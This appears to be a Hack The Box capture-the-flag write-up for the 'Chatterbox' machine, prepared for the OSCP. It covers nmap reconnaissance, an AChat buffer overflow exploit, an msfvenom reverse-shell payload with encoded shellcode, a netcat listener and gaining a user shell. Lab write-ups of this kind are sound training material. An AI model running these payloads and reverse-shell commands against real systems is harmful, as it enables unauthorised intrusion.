<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->




<!doctype html>
<html lang="en" class="no-js">
  <head>
    
	
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
      
      
        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Chatterbox Writeup wo Metasploit/">
      
      
        <meta name="author" content="Rushi Chaudhari">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
	<meta name="format-detection" content="telephone=no">

    
      
        <title>34. Chatterbox Writeup w/o Metasploit.md - Hackthebox Solutions</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
      
      
        
        
        <meta name="theme-color" content="#009688">
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../css/katex.css">
    
      <link rel="stylesheet" href="../../css/custom.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#reconnaissance" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Hackthebox Solutions
            </span>
            <span class="md-header-nav__topic">
              
                34. Chatterbox Writeup w/o Metasploit.md
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Hackthebox Solutions
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Preface" class="md-nav__link">
      Preface
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      I Retired
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        I Retired
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
      1. Access Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
      2. Jerry Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
      3. Blue Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
      4. Blocky Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
      5. Calamity Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Devoops Writeup/" title="6. Devoops Writeup.md" class="md-nav__link">
      6. Devoops Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
      7. Apocalyst Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Poison Writeup wo Metasploit/" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link">
      8. Poison Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
      9. Postman Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
      10. Beep Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
      11. Help Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
      12. Mirai Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
      13. Curling Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
      14. Nibbles Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Valentine Writeup wo Metasploit/" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link">
      15. Valentine Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
      16. Popcorn Writeups.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Cronos Writeup/" title="17. Cronos Writeup.md" class="md-nav__link">
      17. Cronos Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
      18. Legacy Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
      19. Openadmin Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
      20. Bank Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
      21. Shocker Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
      22. Luke Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
      23. Arctic Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Granny Writeup/" title="24. Granny Writeup.md" class="md-nav__link">
      24. Granny Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
      25. Netmon Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link">
      26. Sense Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link">
      27. Sunday Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link">
      28. Solidstate Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
      29. Celestial Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
      30. Tenten Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
      31. Optimum Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
      32. Haircut Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
      33. Irked Writeup.md
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
    <a href="./" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link md-nav__link--active">
      34. Chatterbox Writeup w/o Metasploit.md
    </a>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
      35. Bashed Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
      36. Lame Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
      37. Grandpa Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
      38. Swagshop Writeup.md
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Chatterbox Writeup wo Metasploit.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_9HpPZa8NMVpxMHQTxybI6g.png" /></p>
<p>This is the 38th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by <a href="https://twitter.com/TJ_Null">TJ_Null</a> can be found <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">here</a>.</p>
<p>Let’s get started!</p>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>Run the <a href="https://github.com/rkhal101/nmapAutomator">nmapAutomato</a>r script to enumerate open ports and services running on those ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./nmapAutomator.sh 10.10.10.74 All
</pre></div>

<ul>
<li><strong>All</strong>: Runs all the scans consecutively.</li>
</ul>
<p>We get back the following result.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Running all scans on 10.10.10.74
<span class="lineno" data-linenos=" 2 "></span>
<span class="lineno" data-linenos=" 3 "></span>
<span class="lineno" data-linenos=" 4 "></span>---------------------Starting Nmap Quick Scan---------------------
<span class="lineno" data-linenos=" 5 "></span>
<span class="lineno" data-linenos=" 6 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:27 EST
<span class="lineno" data-linenos=" 7 "></span>
<span class="lineno" data-linenos=" 8 "></span>root@kali:~/Desktop/htb/chatterbox# rm -r 10.10.10.74/
<span class="lineno" data-linenos=" 9 "></span>root@kali:~/Desktop/htb/chatterbox# nmapAutomator.sh 10.10.10.74 All
<span class="lineno" data-linenos="10 "></span>
<span class="lineno" data-linenos="11 "></span>Running all scans on 10.10.10.74
<span class="lineno" data-linenos="12 "></span>
<span class="lineno" data-linenos="13 "></span>Host is likely running Windows
<span class="lineno" data-linenos="14 "></span>
<span class="lineno" data-linenos="15 "></span>---------------------Starting Nmap Quick Scan---------------------
<span class="lineno" data-linenos="16 "></span>
<span class="lineno" data-linenos="17 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:31 EST
<span class="lineno" data-linenos="18 "></span>Nmap done: 1 IP address (1 host up) scanned in 101.53 seconds
<span class="lineno" data-linenos="19 "></span>
<span class="lineno" data-linenos="20 "></span>---------------------Starting Nmap Basic Scan---------------------
<span class="lineno" data-linenos="21 "></span>
<span class="lineno" data-linenos="22 "></span>No ports in quick scan.. Skipping!
<span class="lineno" data-linenos="23 "></span>
<span class="lineno" data-linenos="24 "></span>
<span class="lineno" data-linenos="25 "></span>
<span class="lineno" data-linenos="26 "></span>----------------------Starting Nmap UDP Scan----------------------
<span class="lineno" data-linenos="27 "></span>
<span class="lineno" data-linenos="28 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:33 EST
<span class="lineno" data-linenos="29 "></span>Nmap scan report for 10.10.10.74
<span class="lineno" data-linenos="30 "></span>Host is up.
<span class="lineno" data-linenos="31 "></span>All 1000 scanned ports on 10.10.10.74 are open|filtered
<span class="lineno" data-linenos="32 "></span>
<span class="lineno" data-linenos="33 "></span>Nmap done: 1 IP address (1 host up) scanned in 201.64 seconds
<span class="lineno" data-linenos="34 "></span>
<span class="lineno" data-linenos="35 "></span>---------------------Starting Nmap Full Scan----------------------
<span class="lineno" data-linenos="36 "></span>
<span class="lineno" data-linenos="37 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:36 EST
<span class="lineno" data-linenos="38 "></span>Initiating Parallel DNS resolution of 1 host. at 22:36
<span class="lineno" data-linenos="39 "></span>Completed Parallel DNS resolution of 1 host. at 22:36, 0.12s elapsed
<span class="lineno" data-linenos="40 "></span>Initiating SYN Stealth Scan at 22:36
<span class="lineno" data-linenos="41 "></span>Scanning 10.10.10.74 [65535 ports]
<span class="lineno" data-linenos="42 "></span>Nmap scan report for 10.10.10.74
<span class="lineno" data-linenos="43 "></span>Host is up (0.043s latency).
<span class="lineno" data-linenos="44 "></span>Not shown: 65534 filtered ports
<span class="lineno" data-linenos="45 "></span>PORT     STATE SERVICE
<span class="lineno" data-linenos="46 "></span>9256/tcp open  unknown
<span class="lineno" data-linenos="47 "></span>
<span class="lineno" data-linenos="48 "></span>Read data files from: /usr/bin/../share/nmap
<span class="lineno" data-linenos="49 "></span>Nmap done: 1 IP address (1 host up) scanned in 27674.79 seconds
<span class="lineno" data-linenos="50 "></span>           Raw packets sent: 131092 (5.768MB) | Rcvd: 148 (11.472KB)
<span class="lineno" data-linenos="51 "></span>
<span class="lineno" data-linenos="52 "></span>Making a script scan on all ports
<span class="lineno" data-linenos="53 "></span>
<span class="lineno" data-linenos="54 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST
<span class="lineno" data-linenos="55 "></span>Nmap scan report for 10.10.10.74
<span class="lineno" data-linenos="56 "></span>Host is up (0.042s latency).
<span class="lineno" data-linenos="57 "></span>
<span class="lineno" data-linenos="58 "></span>PORT     STATE SERVICE VERSION
<span class="lineno" data-linenos="59 "></span>9256/tcp open  achat   AChat chat system
<span class="lineno" data-linenos="60 "></span>
<span class="lineno" data-linenos="61 "></span>Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
<span class="lineno" data-linenos="62 "></span>Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
<span class="lineno" data-linenos="63 "></span>
<span class="lineno" data-linenos="64 "></span>---------------------Starting Nmap Vulns Scan---------------------
<span class="lineno" data-linenos="65 "></span>
<span class="lineno" data-linenos="66 "></span>Running CVE scan on all ports
<span class="lineno" data-linenos="67 "></span>
<span class="lineno" data-linenos="68 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST
<span class="lineno" data-linenos="69 "></span>Nmap scan report for 10.10.10.74
<span class="lineno" data-linenos="70 "></span>Host is up (0.035s latency).
<span class="lineno" data-linenos="71 "></span>
<span class="lineno" data-linenos="72 "></span>PORT     STATE SERVICE VERSION
<span class="lineno" data-linenos="73 "></span>9256/tcp open  achat   AChat chat system
<span class="lineno" data-linenos="74 "></span>
<span class="lineno" data-linenos="75 "></span>Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
<span class="lineno" data-linenos="76 "></span>Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
<span class="lineno" data-linenos="77 "></span>
<span class="lineno" data-linenos="78 "></span>Running Vuln scan on all ports
<span class="lineno" data-linenos="79 "></span>
<span class="lineno" data-linenos="80 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST
<span class="lineno" data-linenos="81 "></span>Nmap scan report for 10.10.10.74
<span class="lineno" data-linenos="82 "></span>Host is up (0.039s latency).
<span class="lineno" data-linenos="83 "></span>
<span class="lineno" data-linenos="84 "></span>PORT     STATE SERVICE VERSION
<span class="lineno" data-linenos="85 "></span>9256/tcp open  achat   AChat chat system
<span class="lineno" data-linenos="86 "></span>|_clamav-exec: ERROR: Script execution failed (use -d to debug)
<span class="lineno" data-linenos="87 "></span>
<span class="lineno" data-linenos="88 "></span>Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
<span class="lineno" data-linenos="89 "></span>Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
<span class="lineno" data-linenos="90 "></span>
<span class="lineno" data-linenos="91 "></span>---------------------Finished all Nmap scans---------------------
</pre></div>

<p>We have one port open.</p>
<ul>
<li><strong>Port 9256</strong>:** **running AChat chat system</li>
</ul>
<p>Before we move on to enumeration, let’s make some mental notes about the scan results.</p>
<ul>
<li>Port 9256 is running some kind of chat system that I’m not familiar with, so the first we’ll do is google it to figure out what it is. Then we’ll run searchsploit on it to see if it is associated to any known vulnerabilities.</li>
</ul>
<h1 id="enumeration">Enumeration</h1>
<p>Doing a quick google search on the service tells us that AChat is a software that enables you to chat on your local network. It can also be used to share and send files/images to other users.</p>
<p>Now that we know what it is, let’s run searchsploit on it.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_-bEFqyrr_dYyPmeSzTn68A.png" /></p>
<p>It’s vulnerable to a remote buffer overflow and there is both apython and metasploit exploit for it. We will of course work with the non-metasploit solution.</p>
<p>Copy the python script to your current directory.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>searchsploit -m 36025
</pre></div>

<p>Looking at the exploit code we make note of the following things:</p>
<ul>
<li>
<p>It looks like your classic stack buffer overflow that allows you to overflow the buffer and include malicious shell code that will get executed on the box.</p>
</li>
<li>
<p>The exploit author was nice enough to give us the msfvenom command that generates the malicious payload (<em>‘buf’ </em>variable) including the bad characters to avoid. This makes our life so much easier! The command simply spawns the <em>calc.exe</em> program on the target machine. So we’ll have to change the command to send a reverse shell back to our attack machine.</p>
</li>
<li>
<p>We also need to change the <em>server_address </em>to that of the IP address of Chatterbox.</p>
</li>
<li>
<p>There seems to be a length limit of 1152 bytes on the payload. Anything that exceeds that will probably not work. We’ll keep that in mind when using msfvenom to generate our reverse shell.</p>
</li>
</ul>
<h1 id="initial-foothold">Initial Foothold</h1>
<p>Use msfvenom to generate the reverse shell payload.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister=EAX -f python
</pre></div>

<p>We get back the following result.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos=" 1 "></span>Found 1 compatible encoders
<span class="lineno" data-linenos=" 2 "></span>Attempting to encode payload with 1 iterations of x86/unicode_mixed
<span class="lineno" data-linenos=" 3 "></span>x86/unicode_mixed succeeded with size 774 (iteration=0)
<span class="lineno" data-linenos=" 4 "></span>x86/unicode_mixed chosen with final size 774
<span class="lineno" data-linenos=" 5 "></span>Payload size: 774 bytes
<span class="lineno" data-linenos=" 6 "></span>Final size of python file: 3767 bytes
<span class="lineno" data-linenos=" 7 "></span>buf =  b&quot;&quot;
<span class="lineno" data-linenos=" 8 "></span>buf += b&quot;\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49&quot;
<span class="lineno" data-linenos=" 9 "></span>buf += b&quot;\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41&quot;
<span class="lineno" data-linenos="10 "></span>buf += b&quot;\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41&quot;
<span class="lineno" data-linenos="11 "></span>buf += b&quot;\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51&quot;
<span class="lineno" data-linenos="12 "></span>buf += b&quot;\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31&quot;
<span class="lineno" data-linenos="13 "></span>buf += b&quot;\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41&quot;
<span class="lineno" data-linenos="14 "></span>buf += b&quot;\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41&quot;
<span class="lineno" data-linenos="15 "></span>buf += b&quot;\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41&quot;
<span class="lineno" data-linenos="16 "></span>buf += b&quot;\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41&quot;
<span class="lineno" data-linenos="17 "></span>......[truncated]
</pre></div>

<p>The payload size is 774 bytes, so within the limit. Copy the payload and add it in place of the payload included in the exploit. Also change the IP address to Chatterbox’s IP address.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span># Create a UDP socket
<span class="lineno" data-linenos="2 "></span>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
<span class="lineno" data-linenos="3 "></span>server_address = (&#39;10.10.10.74&#39;, 9256)
</pre></div>

<p>Then setup a listener on the attack machine to receive the reverse shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 1234
</pre></div>

<p>Run the exploit.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/chatterbox# python 36025.py
<span class="lineno" data-linenos="2 "></span>----&gt;{P00F}!
</pre></div>

<p>We get a shell!</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_XK-pIFAJyBDZVuw7RA4MSQ.png" /></p>
<p>Grab the <em>user.txt</em> flag.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_AxvyV0VE64vlTeih-UKZIA.png" /></p>
<p>We’re running as a low privileged user, so we’ll need to escalate privileges.</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Display the user account information.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_pLWQwPKFiIv4iXor0MDgFg.png" /></p>
<p>Next, view all the users on the system.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_FN02_FJZDN_YRYV1aOoL8A.png" /></p>
<p>We have three users. The user we want to compromise is the <em>Administrator</em> account.</p>
<p>Next, let’s check the system privileges that are enabled for the <em>Alfred</em> user.</p>
<p><img alt="" src="../../img/Chatterbox Writeup wo Metasploit/1_AY1Fl2DcrI9awi36T9HAiA.png" /></p>
